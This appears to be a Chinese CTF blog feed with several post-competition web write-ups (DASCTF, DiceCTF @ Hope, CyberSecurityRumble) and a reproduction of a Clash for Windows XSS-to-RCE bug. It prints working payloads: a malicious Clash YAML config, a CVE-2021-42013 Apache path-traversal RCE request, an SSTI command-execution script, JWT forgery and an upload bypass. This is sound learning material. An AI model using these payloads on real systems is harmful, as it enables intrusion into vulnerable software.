<h1 id="x00">/x00</h1>
<img src="https://img.hzy2003628.top/0863c64d06504cf96557fe9887f8f9a8.png" alt="image-20220322212436100" style="zoom:200%;">
<p>需要绕过ereg()函数，有两种方法：</p>
<blockquote>
<p>payload1<br>
<a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf%5B%5D=#biubiubiu">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=#biubiubiu</a><br>
payload2 00截断<br>
<a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%23biubiubiu">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%23biubiubiu</a></p>
</blockquote>
<img src="https://img.hzy2003628.top/6dd6f5b75648361f0ead3df28e402c0c.png" alt="image-20220322212812889" style="zoom:200%;">
<h1 id="bypass-again">bypass again</h1>
<img src="https://img.hzy2003628.top/93c52986279b443fac141fabfc372088.png" alt="image-20220322213000572" style="zoom:200%;">
<p>代码审计和上面那个md5题一样的原理，就是让开头的标志一样，然后就可以通过。</p>
<img src="https://img.hzy2003628.top/2a47268dd21f8fb4c14d539036d011bb.png" alt="image-20220322213258772" style="zoom:200%;">
<h1 id="上传绕过">上传绕过</h1>
<img src="https://img.hzy2003628.top/c5fab755acef595fa369f21772ad3f70.png" alt="image-20220322213812013" style="zoom:200%;">
<p>这道题先正常上传一个图片显示必须上传php格式的文件<img src="https://img.hzy2003628.top/4aa55dca3e515e5ade47a2ea9bbaf4b6.png" alt="image-20220323190037077" style="zoom:200%;"></p>
<p>再上传php文件又显示只能上传图片<img src="https://img.hzy2003628.top/768abded5dae4136a30f03ec879a7aec.png" alt="image-20220323190128511" style="zoom:200%;"></p>
<p>正确的做法是先抓包把2文件名改成muma.php.jpg，然后dir路径改为uploads/muma.php+</p>
<p>然后因为“+”的十六进制值为2b，这个时候再去hex找+，把2b改成00之后再放包!<img src="https://img.hzy2003628.top/8bc9b02a21b9dcd997e91eec086a1fe5.png" alt="image-20220323190359584" style="zoom:200%;"></p>
<h1 id="变量覆盖">变量覆盖</h1>
<img src="https://img.hzy2003628.top/2de4df5d4adc83e9e31d66d9908ee952.png" alt="image-20220323190500865" style="zoom:200%;">
<p>下面给了提示，访问一下那个路径发现源码<img src="https://img.hzy2003628.top/1efe019c30c47321427e0788b7bd4593.png" alt="image-20220323190618568" style="zoom:200%;">extract() 函数从数组中将变量导入到当前的符号表。</p>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
<p>第二个参数 <em>type</em> 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p>
<p>该函数返回成功导入到符号表中的变量数目。</p>
<p>所以这道题给pass和thepassword_123用post传一个相同的值即可</p>
<img src="https://img.hzy2003628.top/208f464f6397d3e111314959f4865c87.png" alt="image-20220323191016328" style="zoom:200%;">
<h1 id="php是世界上最好的语言">PHP是世界上最好的语言</h1>
<p>挂了</p>
<h1 id="伪装者">伪装者</h1>
<img src="https://img.hzy2003628.top/22662c55a402f329b2d9800ee8e0cb37.png" alt="image-20220323191313280" style="zoom:200%;">
<p>抓包修改一下地址<img src="https://img.hzy2003628.top/a1cf9d02633484a67d8bfbf4b6b706cb.png" alt="image-20220323191549273" style="zoom:200%;"></p>
<blockquote>
<p>X-Forwarded-For:127.0.0.1</p>
</blockquote>
<p>理论上这样就行了，但是不行，在网上找应该是题目出了问题！</p>
<h1 id="header">Header</h1>
<img src="https://img.hzy2003628.top/b18de2a56853547a954c53f9514fd366.png" alt="image-20220323191825565" style="zoom:200%;">
<p>挂的题太多，不想做了，就到这吧！</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Clash漏洞</title>
    <url>/2022/03/02/Clash%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>前段时间clash软件出现RCE漏洞，在这里将漏洞进行复现！</p>
<p><img src="https://z4a.net/images/2022/06/14/image06d498f82885114b.png" alt="image06d498f82885114b.png"></p>
<span id="more"></span>
<p>该漏洞影响0.19.9版本以下。</p>
<pre><code class="hljs plaintext">port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
    type: socks5
    server: 127.0.0.1
    port: &quot;17938&quot;
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: &quot;8088&quot;
    skip-cert-verify: true

proxy-groups:
  -
    name: &lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
    type: select
    proxies:
    - a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
</code></pre>
<p>将POC放入文件中如txt或者yaml然后import导入，此时再点击proxies即可触发poc弹出计算机</p>
<img src="https://img.hzy2003628.top/8ff964228acdbe2f723da97472824b88.png" alt="image-20220302214318129" style="zoom:200%;">
<h2 id="原理">原理</h2>
<p>clash 使用了Electron框架，且nodeIntegration值为True，说明开启了Node.js扩展,于是我们可以调用node.js模块从XSS到RCE</p>
<p>只要不进行严格的过滤，就会造成rce</p>
<pre><code class="hljs plaintext">require(‘child_process’).exec(&#x27;&#x27;)
1</code></pre>
<p>形如这样的漏洞已经出现很多如</p>
<ul>
<li>蚁剑</li>
<li>xmind 2020等等</li>
</ul>
<p>所以还是谨慎开启nodeIntegration参数，如果开启一定要对用户可控输入点做好充分的过滤</p>
<ul>
<li>如特殊字符实体编码等</li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CyberSecurityRumble Quals</title>
    <url>/2023/07/10/CyberSecurityRumble%20Quals/</url>
    <content><![CDATA[<p>练练</p>
<span id="more"></span>
<h1 id="backup">BACKUP</h1>
<blockquote>
<p>This company has an interesting approach to backuping their routers. I sniffed the network traffic while they conducted a backup. Check if you find something interesting.</p>
</blockquote>
<p>流量分析TCP流，有个密码sup3rs3cur3</p>
<img src="http://img.hzy2003628.top/image-20230710222532662.png" alt="image-20230710222532662" style="zoom:200%;">
<p>后面又找到个压缩包，解密得到flag</p>
<img src="http://img.hzy2003628.top/image-20230710222603898.png" alt="image-20230710222603898" style="zoom:200%;">
<img src="http://img.hzy2003628.top/image-20230710222811487.png" alt="image-20230710222811487" style="zoom:200%;">
<p>flag{TelnetAndFTPAreSoVErySecure}</p>
<h1 id="chapgpyt">CHAPGPYT</h1>
<blockquote>
<p>I’ve made ChatGPT implemented a challenge. I hope you can solve this verry hard challenge</p>
</blockquote>
<img src="http://img.hzy2003628.top/image-20230710203823307.png" alt="image-20230710203823307" style="zoom:200%;">
<p>抓包，一共有俩包</p>
<img src="http://img.hzy2003628.top/image-20230710203909535.png" alt="image-20230710203909535" style="zoom:200%;">
<img src="http://img.hzy2003628.top/image-20230710203920778.png" alt="image-20230710203920778" style="zoom:200%;">
<p>POST的这个包每次传参之后会回显一堆hash值</p>
<img src="http://img.hzy2003628.top/image-20230710203955051.png" alt="image-20230710203955051" style="zoom:200%;">
<p>解密</p>
<img src="http://img.hzy2003628.top/image-20230710204048008.png" alt="image-20230710204048008" style="zoom:200%;">
<p>然后这里就是需要猜一下了，GET传参尝试把post_message改成get_message，然后跟上密文发包发现就是可以解密</p>
<img src="http://img.hzy2003628.top/image-20230710204415830.png" alt="image-20230710204415830" style="zoom:200%;">
<p>尝试很多次，发现就是传的值明文是1的情况下成功输出flag，就是md5加密构造1输出即可</p>
<img src="http://img.hzy2003628.top/image-20230710204611096.png" alt="image-20230710204611096" style="zoom:200%;">
<p>CSR{GrindingChatGPTUntilItGivesYOuAChallangeLol}</p>
<h1 id="a-good-vue">A GOOD VUE</h1>
<blockquote>
<p>Check out my cool artworks over there: goodvue.rumble.host If you want an Admin to check out your cool stuff: goodvue-bot.rumble.host</p>
</blockquote>
<p>题目提示有bot，应该就是XSS</p>
<img src="http://img.hzy2003628.top/image-20230710204810460.png" alt="image-20230710204810460" style="zoom:200%;">
<p>VUE框架</p>
<img src="http://img.hzy2003628.top/image-20230710204829190.png" alt="image-20230710204829190" style="zoom:200%;">
<p>点击EXPLOIT弹框</p>
<img src="http://img.hzy2003628.top/image-20230710204853507.png" alt="image-20230710204853507" style="zoom:200%;">
<p>一直抓包拦截发现有个有用的数据包</p>
<img src="http://img.hzy2003628.top/image-20230710205227136.png" alt="image-20230710205227136" style="zoom:200%;">
<p>寻找路由发现有个传参点，构造一下</p>
<img src="http://img.hzy2003628.top/image-20230710210825632.png" alt="image-20230710210825632" style="zoom:200%;">
<blockquote>
<p>Accept: application/json, text/plain, <em>/</em></p>
<p>Content-Type: application/json</p>
</blockquote>
<img src="http://img.hzy2003628.top/image-20230710221605124.png" alt="image-20230710221605124" style="zoom:200%;">
<img src="http://img.hzy2003628.top/image-20230710221634568.png" alt="image-20230710221634568" style="zoom:200%;">
<p>尝试是否解析</p>
<img src="http://img.hzy2003628.top/image-20230710221922817.png" alt="image-20230710221922817" style="zoom:200%;">
<img src="http://img.hzy2003628.top/image-20230710221933140.png" alt="image-20230710221933140" style="zoom:200%;">
<p>直接用远程XSS平台带出来管理员的cookie，base64解码得到flag</p>
<p><img src="http://img.hzy2003628.top/flag.png" alt="flag"></p>
<pre><code class="hljs plaintext">CSR&#123;3v3n_vu3_c4n_h4v3_XSS&#125;</code></pre>]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022DASCTF MAY 出题人挑战赛</title>
    <url>/2022/05/22/DASCTF/</url>
    <content><![CDATA[<p><strong>2022DASCTF MAY 出题人挑战赛</strong>,比赛的时候忘记了，赛后复盘一下web题目</p>
<span id="more"></span>
<h1 id="power-cookie">Power Cookie</h1>
<p><img src="https://z4a.net/images/2022/05/22/imagec68c8f1f7be1947f.png" alt></p>
<p>bp抓包看一下<img src="https://z4a.net/images/2022/05/22/image2959211a0ed6dd7b.png" alt></p>
<p>加个cookie: admin=1，得到flag<img src="https://z4a.net/images/2022/05/22/imageab52b08dd3c450c7.png" alt></p>
<p>DASCTF{ad221339-14b2-4a5e-9d23-e2a0aaefbb2c}</p>
<h1 id="魔法浏览器">魔法浏览器</h1>
<p><a href="https://z4a.net/image/2w3Jr9"><img src="https://z4a.net/images/2022/05/22/image6d1e169fcfa2b3aa.png" alt="image6d1e169fcfa2b3aa.png"></a></p>
<p>直接访问404，抓包看一下<a href="https://z4a.net/image/2w3c45"><img src="https://z4a.net/images/2022/05/22/image42d4e74562a38469.md.png" alt="image42d4e74562a38469.md.png"></a></p>
<pre><code class="hljs plaintext">&quot;\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30 \x28\x57\x69\x6e\x64\x6f\x77\x73 \x4e\x54 \x31\x30\x2e\x30\x3b \x57\x69\x6e\x36\x34\x3b \x78\x36\x34\x29 \x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36 \x28\x4b\x48\x54\x4d\x4c\x2c \x6c\x69\x6b\x65 \x47\x65\x63\x6b\x6f\x29 \x4d\x61\x67\x69\x63\x2f\x31\x30\x30\x2e\x30\x2e\x34\x38\x39\x36\x2e\x37\x35&quot;;    console[&quot;\x6c\x6f\x67&quot;](ua);</code></pre>
<p>Unicode-str解码后得到</p>
<pre><code class="hljs plaintext">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75</code></pre>
<p>替换UA得到flag<a href="https://z4a.net/image/2w3i5h"><img src="https://z4a.net/images/2022/05/22/image1560deb399960ddc.png" alt="image1560deb399960ddc.png"></a></p>
<p>DASCTF{7b6f6dfb-4d9d-40ff-8ae5-d696c93302c3}</p>
<h1 id="getme">getme</h1>
<p><a href="https://www.cnblogs.com/L0ading/p/15406905.html">CVE-2021-42013 Apache HTTPd 2.4.49 2.4.50 路径穿越以及RCE漏洞</a></p>
<p>抓包然后</p>
<pre><code class="hljs plaintext">POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</code></pre>
<pre><code class="hljs plaintext">echo;cat /diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg</code></pre>
<p><img src="https://z4a.net/images/2022/05/25/imagee6f1a029f79e3fee.png" alt="imagee6f1a029f79e3fee.png"></p>
<p>DASCTF{6e919d79-7742-4e38-a323-6b02d2041055}</p>
<h1 id="hackme">hackme</h1>
<p><img src="https://z4a.net/images/2022/05/31/image58d6aa7fd8a441e3.png" alt="image58d6aa7fd8a441e3.png"></p>
<p>一些go文件，点了会有回显，可以上传go文件，写一个命令执行</p>
<pre><code class="hljs plaintext">package main

import (
   &quot;fmt&quot;
   &quot;os/exec&quot;
)
func reverseshell() &#123;
   out, _ := exec.Command(&quot;cat&quot;, &quot;/flag&quot;).Output()
   output := string(out[:])
   fmt.Println(output)
&#125;
func main() &#123;
   reverseshell()
&#125;</code></pre>
<p>然后上传，访问usres，得到flag</p>
<p><img src="https://z4a.net/images/2022/05/31/image57124835ffcfae0d.png" alt="image57124835ffcfae0d.png"></p>
<pre><code class="hljs plaintext">DASCTF&#123;b5ce4552-3855-4243-81c4-3f4a14b8f18f&#125;</code></pre>
<h1 id="fxxkgo">fxxkgo</h1>
<p>这道题是基于go语言的</p>
<p>代码审计</p>
<p>ssti</p>
<p>jwt伪造</p>
<p>题目源码如下</p>
<pre><code class="hljs plaintext">package main

import (
   &quot;encoding/json&quot;
   &quot;fmt&quot;
   &quot;github.com/gin-gonic/gin&quot;
   &quot;github.com/golang-jwt/jwt&quot;
   &quot;os&quot;
   &quot;text/template&quot;
)

type Account struct &#123;
   id         string
   pw         string
   is_admin   bool
   secret_key string
&#125;

type AccountClaims struct &#123;
   Id       string `json:&quot;id&quot;`
   Is_admin bool   `json:&quot;is_admin&quot;`
   jwt.StandardClaims
&#125;

type Resp struct &#123;
   Status bool   `json:&quot;status&quot;`
   Msg    string `json:&quot;msg&quot;`
&#125;

type TokenResp struct &#123;
   Status bool   `json:&quot;status&quot;`
   Token  string `json:&quot;token&quot;`
&#125;

var acc []Account
var secret_key = os.Getenv(&quot;KEY&quot;)
var flag = os.Getenv(&quot;FLAG&quot;)
var admin_id = os.Getenv(&quot;ADMIN_ID&quot;)
var admin_pw = os.Getenv(&quot;ADMIN_PW&quot;)

func get_account(uid string) Account &#123;
   for i := range acc &#123;
      if acc[i].id == uid &#123;
         return acc[i]
      &#125;
   &#125;
   return Account&#123;&#125;
&#125;
func clear_account() &#123;
   acc = acc[:1]
&#125;

func jwt_encode(id string, is_admin bool) (string, error) &#123;
   claims := AccountClaims&#123;
      id, is_admin, jwt.StandardClaims&#123;&#125;,
   &#125;
   token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
   return token.SignedString([]byte(secret_key))
&#125;

func jwt_decode(s string) (string, bool) &#123;
   token, err := jwt.ParseWithClaims(s, &amp;AccountClaims&#123;&#125;, func(token *jwt.Token) (interface&#123;&#125;, error) &#123;
      return []byte(secret_key), nil
   &#125;)
   if err != nil &#123;
      fmt.Println(err)
      return &quot;&quot;, false
   &#125;
   if claims, ok := token.Claims.(*AccountClaims); ok &amp;&amp; token.Valid &#123;
      return claims.Id, claims.Is_admin
   &#125;
   return &quot;&quot;, false
&#125;


func rootHandler(c *gin.Context) &#123;
   token := c.GetHeader(&quot;X-Token&quot;)
   if token != &quot;&quot; &#123;
      id, _ := jwt_decode(token)
      acc := get_account(id)
      tpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)
      if err != nil &#123;
      &#125;
      tpl.Execute(c.Writer, &amp;acc)
      return
   &#125; else &#123;

      return
   &#125;
&#125;

func flagHandler(c *gin.Context) &#123;
   token := c.GetHeader(&quot;X-Token&quot;)
   if token != &quot;&quot; &#123;
      id, is_admin := jwt_decode(token)
      if is_admin == true &#123;
         p := Resp&#123;true, &quot;Hi &quot; + id + &quot;, flag is &quot; + flag&#125;
         res, err := json.Marshal(p)
         if err != nil &#123;
         &#125;
         c.JSON(200, string(res))
         return
      &#125; else &#123;
         c.JSON(403, gin.H&#123;
            &quot;code&quot;: 403,
            &quot;status&quot;: &quot;error&quot;,
         &#125;)
         return
      &#125;
   &#125;
&#125;

func authHandler(c *gin.Context) &#123;
   uid := c.PostForm(&quot;id&quot;)
   upw := c.PostForm(&quot;pw&quot;)
   if uid == &quot;&quot; || upw == &quot;&quot; &#123;
      return
   &#125;
   if len(acc) &gt; 1024 &#123;
      clear_account()
   &#125;
   user_acc := get_account(uid)
   if user_acc.id != &quot;&quot; &amp;&amp; user_acc.pw == upw &#123;
      token, err := jwt_encode(user_acc.id, user_acc.is_admin)
      if err != nil &#123;
         return
      &#125;
      p := TokenResp&#123;true, token&#125;
      res, err := json.Marshal(p)
      if err != nil &#123;
      &#125;
      c.JSON(200, string(res))
      return
   &#125;
   c.JSON(403, gin.H&#123;
      &quot;code&quot;: 403,
      &quot;status&quot;: &quot;error&quot;,
   &#125;)
   return
&#125;


func Resist(c *gin.Context)&#123;
   uid := c.PostForm(&quot;id&quot;)
   upw := c.PostForm(&quot;pw&quot;)
   if uid == &quot;&quot; || upw == &quot;&quot; &#123;
      return
   &#125;
   if get_account(uid).id != &quot;&quot; &#123;
      c.JSON(403, gin.H&#123;
         &quot;code&quot;: 403,
         &quot;status&quot;: &quot;error&quot;,
      &#125;)
      return
   &#125;
   if len(acc) &gt; 4 &#123;
      clear_account()
   &#125;
   new_acc := Account&#123;uid, upw, false, secret_key&#125;
   acc = append(acc, new_acc)

   p := Resp&#123;true, &quot;&quot;&#125;
   res, err := json.Marshal(p)
   if err != nil &#123;
   &#125;
   c.JSON(200, string(res))
   return
&#125;
func index(c *gin.Context) &#123;
   c.JSON(200,gin.H&#123;
      &quot;msg&quot;: &quot;Hello World&quot;,
   &#125;)
&#125;

func main()  &#123;
   admin := Account&#123;admin_id, admin_pw, true, secret_key&#125;
   acc = append(acc, admin)
   r := gin.Default()
   r.GET(&quot;/&quot;,index)
   r.POST(&quot;/&quot;, rootHandler)
   r.POST(&quot;/flag&quot;, flagHandler)
   r.POST(&quot;/auth&quot;, authHandler)
   r.POST(&quot;/register&quot;, Resist)
   r.Run(&quot;:80&quot;)

&#125;</code></pre>
<p>通过看main函数得知存在五个路由<img src="https://z4a.net/images/2022/05/31/imagedc5bc897b554f7e5.png" alt="imagedc5bc897b554f7e5.png"></p>
<p>总的来说就是五个路由都走一遍就可以得到flag，这里系统分析一下这几个路由的作用，也算学习一下了</p>
<pre><code class="hljs plaintext">func index(c *gin.Context) &#123;
   c.JSON(200,gin.H&#123;
      &quot;msg&quot;: &quot;Hello World&quot;,
   &#125;)
&#125;
这个是get请求的根目录</code></pre>
<pre><code class="hljs plaintext">func rootHandler(c *gin.Context) &#123;
   token := c.GetHeader(&quot;X-Token&quot;)
   if token != &quot;&quot; &#123;
      id, _ := jwt_decode(token)
      acc := get_account(id)
      tpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)
      if err != nil &#123;
      &#125;
      tpl.Execute(c.Writer, &amp;acc)
      return
   &#125; else &#123;

      return
   &#125;
&#125;
这个是post请求实现的功能</code></pre>
<pre><code class="hljs plaintext">tpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)
而这句话存在ssti漏洞</code></pre>
<p>剩下几个路由看看就行了，毕竟已经找到了漏洞，</p>
<p>​	根据分析<strong>register</strong>是用来创建用户<strong>id</strong>和<strong>pw</strong>的，存入已经定义好的结构体中</p>
<pre><code class="hljs Go"><span class="hljs-keyword">type</span> Account <span class="hljs-keyword">struct</span> &#123;
   id         <span class="hljs-type">string</span>
   pw         <span class="hljs-type">string</span>
   is_admin   <span class="hljs-type">bool</span>
   secret_key <span class="hljs-type">string</span>
&#125;</code></pre>
<p>所以首先先注册一下<img src="https://z4a.net/images/2022/05/31/image7496d9bbea766e2e.png" alt="image7496d9bbea766e2e.png"></p>
<p>这个时候再用auth查看下路由，可以看到得到了一个jwt<img src="https://z4a.net/images/2022/05/31/imageb2794d98b33c4845.png" alt="imageb2794d98b33c4845.png"></p>
<pre><code class="hljs plaintext">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Imh1YW5nIiwiaXNfYWRtaW4iOmZhbHNlfQ.1pxpRWSXDJi2wGLiYJVUT4WqVYZfDX8iIFyauR4qVnM</code></pre>
<p>现在需要做的就是搞到密钥将jwt换上<img src="https://z4a.net/images/2022/05/31/imagea404a9e032351599.png" alt="imagea404a9e032351599.png"></p>
<p>可以看到我注册的账号，利用这个账号进行ssti注入，利用**{ {.}}**即查看所有内容，最后可以查到密匙</p>
<p>再注册一个号</p>
<p><img src="https://z4a.net/images/2022/05/31/imagea420e9ed460b4050.png" alt="imagea420e9ed460b4050.png"></p>
<p>一样的思路步骤<img src="https://z4a.net/images/2022/05/31/image87b8ab679bf1c466.png" alt="image87b8ab679bf1c466.png"></p>
<pre><code class="hljs plaintext">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.1c8I_PzGiyonSZe3UPM2AB94x07g6DeyJW6uYA2C7eo</code></pre>
<p><img src="https://z4a.net/images/2022/05/31/image0cd0c392d6c0e4e6.png" alt="image0cd0c392d6c0e4e6.png"></p>
<pre><code class="hljs plaintext">fasdf972u1041xu90zm10Av</code></pre>
<p>然后jwt身份伪造</p>
<p><img src="https://z4a.net/images/2022/05/31/image4c109e46d4b14a35.png" alt="image4c109e46d4b14a35.png"></p>
<p>将伪造的jwt写进去，得到flag</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DiceCTF @ Hope</title>
    <url>/2022/07/25/DiceCTF%20@%20Hope/</url>
    <content><![CDATA[<p><img src="http://img.hzy2003628.top/202207232211222.png" alt="image-20220723221150162"></p>
<p>DiceCTF @ Hope</p>
<span id="more"></span>
<hr>
<h1 id="前言">前言</h1>
<p>这个比赛感觉有亿点点难，比那个LIT CTF难多了，这三天打了这俩比赛，累dei。</p>
<h1 id="misc">misc</h1>
<h2 id="discord"><strong>discord</strong></h2>
<blockquote>
<p>Please join our Discord server for challenge updates and other important announcements!</p>
</blockquote>
<p>hope{a0bffd79ddaa5de3fd8ed2e60a143b08}</p>
<h2 id="orphan"><strong>orphan</strong></h2>
<blockquote>
<p>nothing to see here</p>
</blockquote>
<p>下载附件发现是git源码，找HEAD得到分析得到如下add flag</p>
<p><img src="http://img.hzy2003628.top/202207231558967.png" alt="image-20220723155844887"></p>
<p>add flag的commit id是b53c9e6864ed176ea0192fd8283362a41d94906c，溯源得到flag</p>
<p><img src="http://img.hzy2003628.top/202207231601579.png" alt="image-20220723160121528"></p>
<p>hope{ba9f11ecc3497d9993b933fdc2bd61e5}</p>
<h1 id="web">web</h1>
<h2 id="secure-page"><strong>secure-page</strong></h2>
<blockquote>
<p>My new website uses cookies for authentication. Now nobody can get in! <a href="https://secure-page.mc.ax/">secure-page.mc.ax</a></p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207231229716.png" alt="image-20220723122949072"></p>
<p>改成true<img src="http://img.hzy2003628.top/202207231231132.png" alt="image-20220723123105053"></p>
<p>hope{signatures_signatures_signatures}</p>
<h2 id="reverser"><strong>reverser</strong></h2>
<blockquote>
<p>An extremely useful tool. Hope there aren’t issues with the server-side templating…</p>
<p>The flag is in a file with an unknown name.</p>
</blockquote>
<p>考察ssti，但是一直报错</p>
<p>队友的脚本，贴一下</p>
<pre><code class="hljs plaintext">import requests
url = &quot;https://reverser.mc.ax/&quot;
while (1):
    cmd = input(&quot;&gt;&quot;)
    payload = r&quot;&quot;&quot;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;&quot;&quot;&quot;
    payload += cmd
    payload += r&quot;&quot;&quot;&#x27;).read()&quot;)&#125;&#125;&quot;&quot;&quot;
    print(requests.post(url, data=&#123;&#x27;text&#x27;:payload[::-1]&#125;).text)
</code></pre>
<p><img src="http://img.hzy2003628.top/202207231613332.png" alt="image-20220723161317272"></p>
<p>hope{cant_misuse_templates}</p>
<h2 id="flag-viewer"><strong>flag-viewer</strong></h2>
<p><img src="http://img.hzy2003628.top/202207231626273.png" alt="image-20220723162608201"></p>
<p>主要代码如下</p>
<pre><code class="hljs plaintext">import os
import random

from server import Server

server = Server()

@server.get(&#x27;/&#x27;)
async def root(request):
    return (200, &#x27;&#x27;&#x27;
        &lt;title&gt;Flag Viewer&lt;/title&gt;
        &lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot; /&gt;
        &lt;div class=&quot;container&quot;&gt;
            &lt;h1&gt;The Flag Viewer&lt;/h1&gt;
            &lt;form action=&quot;/flag&quot; method=&quot;POST&quot;&gt;
                &lt;input
                    type=&quot;text&quot;
                    name=&quot;user&quot;
                    placeholder=&quot;Username&quot;
                    pattern=&quot;^(?!admin).*$&quot;
                    oninvalid=&quot;this.setCustomValidity(&#x27;Name not allowed!&#x27;)&quot;
                    oninput=&quot;this.setCustomValidity(&#x27;&#x27;)&quot;
                /&gt;
                &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
            &lt;/form&gt;
            &lt;div&gt;%s&lt;/div&gt;
        &lt;/div&gt;
    &#x27;&#x27;&#x27; % (
        request.query.get(&#x27;message&#x27;, &#x27;&#x27;).replace(&#x27;&lt;&#x27;, &#x27;&amp;lt;&#x27;),
    ))


@server.post(&#x27;/flag&#x27;)
async def flag(request):
    data = await request.post()
    user = data.get(&#x27;user&#x27;, &#x27;&#x27;)

    if user != &#x27;admin&#x27;:
        return (302, &#x27;/?message=Only the &quot;admin&quot; user can see the flag!&#x27;)

    return (302, f&#x27;/?message=&#123;os.environ.get(&quot;FLAG&quot;, &quot;flag missing!&quot;)&#125;&#x27;)

@server.get(&#x27;/style.css&#x27;, c_type=&#x27;text/css&#x27;)
async def style(request):
    del request
    return (200, &#x27;&#x27;&#x27;
        * &#123;
            font-family: &#x27;Helvetica Neue&#x27;, sans-serif;
            box-sizing: border-box;
        &#125;

        html, body &#123; margin: 0; &#125;

        .container &#123;
            padding: 2rem;
            width: 90%;
            max-width: 900px;
            margin: auto;
        &#125;

        input:not([type=&quot;submit&quot;]) &#123;
            width: 100%;
            padding: 8px;
            margin: 8px 0;
        &#125;
    &#x27;&#x27;&#x27;)

server.run(&#x27;0.0.0.0&#x27;, 3000)</code></pre>
<p>输入admin</p>
<p><img src="http://img.hzy2003628.top/202207231626688.png" alt="image-20220723162618625"></p>
<p>访问flag</p>
<p><img src="http://img.hzy2003628.top/202207231626510.png" alt="image-20220723162646451"></p>
<p>post传</p>
<p><img src="http://img.hzy2003628.top/202207231627757.png" alt="image-20220723162711683"></p>
<p>hope{oops_client_side_validation_again}</p>
<h2 id="point"><strong>point</strong></h2>
<blockquote>
<p>what is the point?</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207231651475.png" alt="image-20220723165127394"></p>
<pre><code class="hljs plaintext">package main

import (
   &quot;encoding/json&quot;
   &quot;fmt&quot;
   &quot;io&quot;
   &quot;log&quot;
   &quot;net/http&quot;
   &quot;os&quot;
   &quot;strings&quot;
)

type importantStuff struct &#123;
   Whatpoint string `json:&quot;what_point&quot;`
&#125;

func main() &#123;
   flag, err := os.ReadFile(&quot;flag.txt&quot;)
   if err != nil &#123;
      panic(err)
   &#125;

   http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) &#123;
      switch r.Method &#123;
      case http.MethodGet:
         fmt.Fprint(w, &quot;Hello, world&quot;)
         return
      case http.MethodPost:
         body, err := io.ReadAll(r.Body)
         if err != nil &#123;
            fmt.Fprintf(w, &quot;Something went wrong&quot;)
            return
         &#125;

         if strings.Contains(string(body), &quot;what_point&quot;) || strings.Contains(string(body), &quot;\\&quot;) &#123;
            fmt.Fprintf(w, &quot;Something went wrong&quot;)
            return
         &#125;

         var whatpoint importantStuff
         err = json.Unmarshal(body, &amp;whatpoint)
         if err != nil &#123;
            fmt.Fprintf(w, &quot;Something went wrong&quot;)
            return
         &#125;

         if whatpoint.Whatpoint == &quot;that_point&quot; &#123;
            fmt.Fprintf(w, &quot;Congrats! Here is the flag: %s&quot;, flag)
            return
         &#125; else &#123;
            fmt.Fprintf(w, &quot;Something went wrong&quot;)
            return
         &#125;
      default:
         fmt.Fprint(w, &quot;Method not allowed&quot;)
         return
      &#125;
   &#125;)

   log.Fatal(http.ListenAndServe(&quot;:8081&quot;, nil))

&#125;</code></pre>
<pre><code class="hljs plaintext">curl -XPOST https://point.mc.ax/ -d &#x27;&#123;&quot;WhAt_point&quot;:&quot;that_point&quot;&#125;&#x27;</code></pre>
<p><img src="http://img.hzy2003628.top/202207231704722.png" alt="image-20220723170427650"></p>
